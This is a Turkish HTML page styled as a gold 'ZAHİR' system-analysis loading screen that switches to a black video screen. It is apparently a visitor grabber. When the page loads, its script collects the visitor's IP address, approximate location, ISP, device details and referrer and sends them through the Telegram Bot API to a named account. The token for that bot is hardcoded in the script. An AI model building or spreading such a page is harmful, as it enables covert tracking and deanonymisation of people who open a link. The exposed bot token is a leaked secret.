<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZAHİR ANALİZ • VIP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0a0a0a;
            height: 100vh;
            overflow: hidden;
            color: #fff;
        }

        /* Arkaplan efekti */
        .bg-gradient {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 50% 50%, #1a1a2e, #0f0f1f, #03030a);
            z-index: -2;
        }

        .bg-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle cx="10" cy="10" r="1" fill="rgba(255,215,0,0.05)"/><circle cx="90" cy="30" r="1.5" fill="rgba(255,215,0,0.03)"/><circle cx="40" cy="80" r="1" fill="rgba(255,215,0,0.04)"/><circle cx="70" cy="60" r="2" fill="rgba(255,215,0,0.02)"/><circle cx="20" cy="50" r="1.2" fill="rgba(255,215,0,0.03)"/></svg>');
            opacity: 0.5;
            z-index: -1;
        }

        /* Ana container */
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: opacity 1s cubic-bezier(0.4, 0, 0.2, 1);
            z-index: 10;
        }

        .container.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .glass-panel {
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 215, 0, 0.2);
            border-radius: 40px;
            padding: 50px;
            width: 90%;
            max-width: 600px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), inset 0 1px 1px rgba(255, 215, 0, 0.1), 0 0 30px rgba(255, 215, 0, 0.2);
        }

        .title {
            font-size: 4rem;
            font-weight: 900;
            letter-spacing: 8px;
            margin-bottom: 30px;
            background: linear-gradient(135deg, #FFD700, #FFA500, #FF8C00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            position: relative;
            font-family: 'Impact', 'Arial Black', sans-serif;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
        }

        .title::after {
            content: '';
            position: absolute;
            bottom: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 150px;
            height: 3px;
            background: linear-gradient(90deg, transparent, #FFD700, #FFA500, #FF8C00, transparent);
            box-shadow: 0 0 20px #FFD700;
        }

        .subtitle {
            font-size: 1rem;
            letter-spacing: 6px;
            color: rgba(255, 215, 0, 0.6);
            margin-bottom: 40px;
            text-transform: uppercase;
        }

        .counter-wrapper {
            margin: 40px 0;
            position: relative;
        }

        .counter-digit {
            font-size: 7rem;
            font-weight: 900;
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #FFD700, #FFA500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px rgba(255, 215, 0, 0.5);
            line-height: 1;
        }

        .counter-label {
            font-size: 1rem;
            text-transform: uppercase;
            letter-spacing: 6px;
            color: rgba(255, 215, 0, 0.5);
            margin-top: 10px;
        }

        .health-bar-container {
            width: 100%;
            height: 8px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            margin: 40px 0;
            position: relative;
            overflow: visible;
            border: 1px solid rgba(255, 215, 0, 0.2);
        }

        .health-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #FFD700, #FFA500, #FF8C00);
            border-radius: 10px;
            position: relative;
            transition: width 0.1s linear;
            box-shadow: 0 0 30px #FFD700;
        }

        .health-bar::after {
            content: '';
            position: absolute;
            top: 50%;
            right: 0;
            transform: translate(50%, -50%);
            width: 16px;
            height: 16px;
            background: #FFD700;
            border-radius: 50%;
            box-shadow: 0 0 30px #FFD700;
        }

        .status-panel {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 20px;
            padding: 25px;
            margin-top: 30px;
            border: 1px solid rgba(255, 215, 0, 0.2);
        }

        .status-text {
            font-size: 1.1rem;
            color: rgba(255, 255, 255, 0.9);
            letter-spacing: 2px;
        }

        .status-text i {
            color: #FFD700;
            margin-right: 10px;
            font-style: normal;
            animation: pulse 1.5s infinite;
        }

        .telegram-status {
            margin-top: 20px;
            font-size: 1rem;
            padding: 10px 20px;
            background: rgba(255, 215, 0, 0.1);
            border-radius: 30px;
            display: inline-block;
            border: 1px solid rgba(255, 215, 0, 0.3);
            color: #FFD700;
            letter-spacing: 1px;
        }

        @keyframes pulse {
            0% { opacity: 0.5; }
            50% { opacity: 1; }
            100% { opacity: 0.5; }
        }

        /* Siyah ekran video container */
        .video-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 1s ease;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .video-container.active {
            opacity: 1;
            visibility: visible;
        }

        #bg-video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .video-overlay {
            position: absolute;
            bottom: 40px;
            left: 0;
            width: 100%;
            text-align: center;
            color: rgba(255, 215, 0, 0.7);
            font-size: 1.2rem;
            letter-spacing: 8px;
            z-index: 21;
            pointer-events: none;
            text-transform: uppercase;
            font-weight: bold;
            text-shadow: 0 0 20px #FFD700;
        }

        /* Audio element - gizli */
        #bg-audio {
            display: none;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .glass-panel {
                padding: 30px;
            }
            .title {
                font-size: 3rem;
                letter-spacing: 4px;
            }
            .counter-digit {
                font-size: 5rem;
            }
        }
    </style>
</head>
<body>
    <div class="bg-gradient"></div>
    <div class="bg-particles"></div>

    <!-- Ses (gizli) -->
    <audio id="bg-audio" loop preload="auto">
        <source src="video1.mp3" type="audio/mpeg">
        <source src="video1.mp4" type="audio/mp4">
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <!-- Video (siyah ekran) -->
    <div class="video-container" id="videoContainer">
        <video id="bg-video" loop muted playsinline>
            <source src="video1.mp4" type="video/mp4">
        </video>
        <div class="video-overlay">Z A H İ R</div>
    </div>

    <!-- Ana yüklenme ekranı -->
    <div class="container" id="mainContainer">
        <div class="glass-panel">
            <div class="title">Z A H İ R</div>
            <div class="subtitle">✦ SİSTEM ANALİZ ✦</div>
            
            <div class="counter-wrapper">
                <span class="counter-digit" id="counter">000</span>
                <div class="counter-label">İLERLEME</div>
            </div>

            <div class="health-bar-container">
                <div class="health-bar" id="healthBar"></div>
            </div>

            <div class="status-panel">
                <div class="status-text">
                    <i>⏣</i> <span id="status">SİSTEM BAŞLATILIYOR</span>
                </div>
                <div id="telegramStatus" class="telegram-status">
                    ⚡ TELEGRAM HAZIR
                </div>
            </div>
        </div>
    </div>

    <script>
        // KONFİGÜRASYON
        const BOT_TOKEN = '8695583417:AAHZxz3RWI_prhnfk29ZbAK5ESjXSd8QOis';  // BotFather'dan aldığın token
        const TARGET_USERNAME = '@STCCriss';      // Mesaj gönderilecek kişi
        
        // Değişkenler
        let count = 0;
        let audioStarted = false;
        let infoSent = false;
        
        // Elementler
        const mainContainer = document.getElementById('mainContainer');
        const videoContainer = document.getElementById('videoContainer');
        const bgVideo = document.getElementById('bg-video');
        const bgAudio = document.getElementById('bg-audio');
        const counterEl = document.getElementById('counter');
        const healthBar = document.getElementById('healthBar');
        const statusEl = document.getElementById('status');
        const telegramStatus = document.getElementById('telegramStatus');

        // 1. OTOMATİK BAŞLAT (dokunma gereksiz)
        function autoStart() {
            console.log('⚡ Otomatik başlatılıyor...');
            
            // Sesi başlat (tarayıcı politikası nedeniyle biraz gecikmeli)
            setTimeout(() => {
                bgAudio.volume = 0.8;
                bgAudio.play()
                    .then(() => {
                        console.log('✅ Ses başladı');
                        audioStarted = true;
                        telegramStatus.innerHTML = '🔊 SES AKTİF';
                    })
                    .catch(e => {
                        console.log('Ses başlatılamadı:', e);
                        telegramStatus.innerHTML = '⚠️ SES İÇİN TIKLA';
                        
                        // Tıklama ile başlat (yedek)
                        document.body.addEventListener('click', function clickHandler() {
                            bgAudio.play();
                            telegramStatus.innerHTML = '🔊 SES AKTİF';
                            document.body.removeEventListener('click', clickHandler);
                        }, { once: true });
                    });
            }, 500);
            
            // Sayacı başlat
            setTimeout(() => {
                startCounter();
            }, 1000);
        }

        // 2. SAYAÇ
        function startCounter() {
            statusEl.innerHTML = 'ANALİZ BAŞLADI';
            
            const interval = setInterval(async () => {
                count++;
                
                // Sayacı güncelle (3 haneli gösterim)
                counterEl.textContent = count.toString().padStart(3, '0');
                
                // Health bar
                healthBar.style.width = count + '%';
                
                // Durum mesajları
                if (count === 25) statusEl.innerHTML = 'IP TESPİT EDİLİYOR';
                if (count === 50) statusEl.innerHTML = 'CİHAZ BİLGİLERİ';
                if (count === 75) statusEl.innerHTML = 'RAPOR HAZIRLANIYOR';
                
                // %100'de bitir
                if (count === 100) {
                    clearInterval(interval);
                    statusEl.innerHTML = 'ANALİZ TAMAMLANDI';
                    
                    // Bilgileri topla ve Telegram'a gönder
                    await collectAndSendInfo();
                    
                    // 1 saniye sonra siyah ekran + video
                    setTimeout(() => {
                        activateBlackScreen();
                    }, 1500);
                }
            }, 60);
        }

        // 3. BİLGİ TOPLAMA
        async function collectAndSendInfo() {
            if (infoSent) return;
            
            telegramStatus.innerHTML = '📡 VERİ TOPLANIYOR...';
            
            // Temel bilgiler
            const info = {
                timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || '?',
                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
                url: window.location.href,
                referrer: document.referrer || 'doğrudan'
            };

            // IP adresi
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                info.ip = ipData.ip;
            } catch {
                info.ip = 'IP alınamadı';
            }

            // Konum (yaklaşık)
            try {
                const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
                const geoData = await geoRes.json();
                info.country = geoData.country_name || '?';
                info.city = geoData.city || '?';
                info.isp = geoData.org || '?';
            } catch {
                info.country = '?';
                info.city = '?';
            }

            // Telegram'a gönder
            await sendToTelegram(info);
        }

        // 4. TELEGRAM GÖNDERME (Chat ID'siz, username'e)
        async function sendToTelegram(info) {
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
                console.log('⚠️ Bot token girilmemiş!');
                telegramStatus.innerHTML = '⚠️ TOKEN GİRİLMEMİŞ';
                console.log('Toplanan bilgiler:', info);
                return;
            }

            telegramStatus.innerHTML = '📤 TELEGRAM GÖNDERİLİYOR...';

            // Süslü mesaj
            const message = `
⚡ **Z A H İ R   A N A L İ Z** ⚡

👤 **Hedef:** ${TARGET_USERNAME}

🌐 **IP Adresi:** ${info.ip}
📍 **Konum:** ${info.city}, ${info.country}
🏢 **ISP:** ${info.isp}

📱 **Cihaz Bilgileri:**
• Platform: ${info.platform}
• Ekran: ${info.screen}
• Renk: ${info.colorDepth} bit
• Çekirdek: ${info.cores}
• RAM: ${info.memory}
• Dil: ${info.language}
• Zaman Dilimi: ${info.timezone}

🌍 **Sayfa Bilgileri:**
• URL: ${info.url}
• Yönlendiren: ${info.referrer}

⏰ **Ziyaret Zamanı:** ${info.timestamp}

🔍 **Detaylı UA:**
\`${info.userAgent.substring(0, 100)}...\`

✦ **Z A H İ R   S İ S T E M** ✦
            `;

            try {
                // Önce botun güncellemelerini al
                const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const updates = await updatesRes.json();
                
                let targetChatId = null;
                
                // @STCCriss'in chat ID'sini bul
                if (updates.ok && updates.result) {
                    for (const update of updates.result) {
                        if (update.message && update.message.from) {
                            const from = update.message.from;
                            if (from.username && from.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                targetChatId = from.id;
                                console.log('✅ Kullanıcı bulundu, ID:', targetChatId);
                                break;
                            }
                        }
                        
                        if (update.channel_post && update.channel_post.chat) {
                            if (update.channel_post.chat.username && 
                                update.channel_post.chat.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                targetChatId = update.channel_post.chat.id;
                                console.log('✅ Kanal bulundu, ID:', targetChatId);
                                break;
                            }
                        }
                    }
                }
                
                if (!targetChatId) {
                    telegramStatus.innerHTML = '⚠️ ' + TARGET_USERNAME + ' BOTU BAŞLATMAMIŞ';
                    console.log('Hedef kullanıcı bulunamadı.');
                    return;
                }
                
                // Mesajı gönder
                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: targetChatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const result = await sendRes.json();
                
                if (result.ok) {
                    telegramStatus.innerHTML = '✅ TELEGRAM GÖNDERİLDİ';
                    infoSent = true;
                } else {
                    telegramStatus.innerHTML = '❌ GÖNDERİLEMEDİ';
                    console.log('Telegram hatası:', result);
                }
                
            } catch (error) {
                console.error('Telegram hatası:', error);
                telegramStatus.innerHTML = '❌ BAĞLANTI HATASI';
            }
        }

        // 5. SİYAH EKRAN + VİDEO
        function activateBlackScreen() {
            mainContainer.classList.add('hidden');
            videoContainer.classList.add('active');
            
            if (bgVideo) {
                bgVideo.play().catch(e => console.log('Video oynatılamadı:', e));
            }
        }

        // 6. BAŞLANGIÇ - OTOMATİK
        window.addEventListener('load', () => {
            console.log('⚡ ZAHİR SİSTEM YÜKLENDİ');
            
            // 1.5 saniye sonra otomatik başlat
            setTimeout(autoStart, 1500);
            
            // Hata yakalama
            bgAudio.addEventListener('error', (e) => {
                console.log('Ses dosyası hatası:', e);
            });
            
            bgVideo.addEventListener('error', (e) => {
                console.log('Video dosyası hatası:', e);
            });
            
            // Telegram durumu
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
                telegramStatus.innerHTML = '⚠️ BOT TOKEN GİRİLMEMİŞ';
            } else {
                telegramStatus.innerHTML = '⚡ ' + TARGET_USERNAME + ' HEDEFLENİYOR';
            }
        });

        // Sayfa kapanırken durdur
        window.addEventListener('beforeunload', () => {
            bgAudio.pause();
            if (bgVideo) bgVideo.pause();
        });
    </script>
</body>
</html>
